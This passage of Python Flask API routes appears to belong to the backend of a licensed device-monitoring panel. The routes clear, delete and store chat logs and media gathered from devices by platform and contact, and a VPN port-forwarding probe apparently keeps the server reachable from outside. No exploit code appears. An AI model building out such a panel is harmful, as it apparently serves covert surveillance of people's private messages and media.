@api_bp.route('/api/device/<device_id>/clear_notif_pending', methods=['POST'], endpoint='clear_notif_pending')
@login_required
def clear_notif_pending(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id in database:
        if "info" not in database[device_id]:
            database[device_id]["info"] = {}
        database[device_id]["info"]["notif_pending"] = "0"
        save_db()
        socketio.emit('device_status_change', {'device_id': device_id})
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Device not found'}), 404

@api_bp.route('/api/device/<device_id>/delete_media/<media_key>', methods=['POST'], endpoint='delete_media')
@login_required
def delete_media(device_id, media_key):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    if device_id in database and "media" in database[device_id]:
        m = database[device_id]["media"].pop(media_key, None)
        if m and "path" in m:
            try:
                os.remove(m["path"])
            except Exception:
                pass
        save_db()
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Media or device not found'}), 404

@api_bp.route('/api/device/<device_id>/clear_chats', methods=['POST'], endpoint='clear_chats')
@login_required
def clear_chats(device_id):
    if not has_device_access(session.get('username'), device_id):
        return jsonify({"error": "Unauthorized", "code": 403}), 403
    req_json = request.json or {}
    platform = req_json.get('platform')
    contact = req_json.get('contact')
    
    if device_id in database and "chats" in database[device_id]:
        if platform:
            platform_key = platform.replace(".", "_")
            if contact:
                contact_key = contact.replace(".", "_").replace(" ", "_")
                if platform_key in database[device_id]["chats"]:
                    database[device_id]["chats"][platform_key].pop(contact_key, None)
            else:
                database[device_id]["chats"].pop(platform_key, None)
        else:
            database[device_id]["chats"] = {}
        save_db()
        socketio.emit('social_message_received', {
            'device_id': device_id,
            'platform': platform or '',
            'contact': contact or '',
            'text': '',
            'isSent': False,
            'time': 0
        })
    return jsonify({'success': True})
    
@api_bp.route('/api/network_status', methods=['GET'], endpoint='network_status')
def network_status():
    return jsonify(get_current_connection_status())

@api_bp.route('/api/user/details', endpoint='user_details_api')
@login_required
def user_details_api():
    username = session.get('username')
    license_key = session.get('license_key')
    if not license_key:
        return jsonify({"success": False, "error": "No active license in session."}), 400
    lic_info = users_database.get("licenses", {}).get(license_key)
    if not lic_info:
        return jsonify({"success": False, "error": "License not found in database."}), 404
    
    current_ts = int(time.time())
    expires_at = lic_info.get("expires_at", 0)
    created_at = lic_info.get("created_at", expires_at - 30 * 86400)
    days_remaining = max(0, int((expires_at - current_ts) / 86400))
    
    return jsonify({
        "success": True,
        "username": username,
        "license_key": license_key,
        "created_at": created_at,
        "expires_at": expires_at,
        "days_remaining": days_remaining,
        "is_active": lic_info.get("is_active", True)
    })

@api_bp.route('/api/user/report_issue', methods=['POST'], endpoint='user_report_issue')
@login_required
def user_report_issue():
    data = request.json or {}
    issue_text = data.get("issue_text", "").strip()
    if not issue_text:
        return jsonify({"success": False, "error": "Issue description cannot be empty."}), 400
    
    if "reports" not in users_database:
        users_database["reports"] = []
        
    chars = string.ascii_uppercase + string.digits
    report_id = "REP-" + "".join(random.choice(chars) for _ in range(6))
    
    new_report = {
        "id": report_id,
        "username": session.get('username'),
        "license_key": session.get('license_key'),
        "issue_text": issue_text,
        "timestamp": int(time.time()),
        "status": "pending"
    }
    users_database["reports"].append(new_report)
    save_users_db()
    return jsonify({"success": True, "message": "Issue reported successfully. Support team will contact you.", "report_id": report_id})

@api_bp.route('/api/vpn/probe', methods=['GET', 'POST'], endpoint='vpn_probe')
def vpn_probe():
    """
    Automated Backend Proton Health-Check Probe:
    Detects current Proton Public IP & Forwarded Port, tests http://<Proton_IP>:<Port>/checkme,
    and returns comprehensive diagnostic report.
    """
    from services.telegram_notifier import get_public_ip, get_forwarded_port
    
    # 1. Fetch current dynamic IP and Port
    ip = get_public_ip()
    port = get_forwarded_port()
    
    probe_url = f"http://{ip}:{port}/checkme" if (ip and port) else None
    
    result = {
        "timestamp": int(time.time()),
        "proton_public_ip": ip,
        "proton_forwarded_port": port,
        "probe_url": probe_url,
        "reachable": False,
        "status_code": None,
        "latency_ms": None,
        "error": None,
        "internal_gateway_ok": False
    }
    
    # Check internal gateway reachability first
    try:
        r_internal = requests.get("http://127.0.0.1:5001/checkme", timeout=2)
        if r_internal.status_code == 200:
            result["internal_gateway_ok"] = True
    except Exception as e:
        result["internal_gateway_ok"] = False
        result["internal_error"] = str(e)

    if not ip or not port:
        result["error"] = "Proton Public IP or Forwarded Port is not available yet (VPN initializing)."
        return jsonify(result), 503

    # Test the external URL via HTTP probe
    t0 = time.time()
    try:
        resp = requests.get(probe_url, timeout=5)
        result["latency_ms"] = round((time.time() - t0) * 1000, 2)
        result["status_code"] = resp.status_code
        if resp.status_code == 200:
            result["reachable"] = True
            result["response_data"] = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text[:200]
        else:
            result["error"] = f"Endpoint returned HTTP {resp.status_code}"
    except requests.exceptions.Timeout:
        result["error"] = "Connection timed out (Proton node port forwarding handshake may be pending or ISP blocked)."
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {str(e)}"

    return jsonify(result), (200 if result["reachable"] else 502)
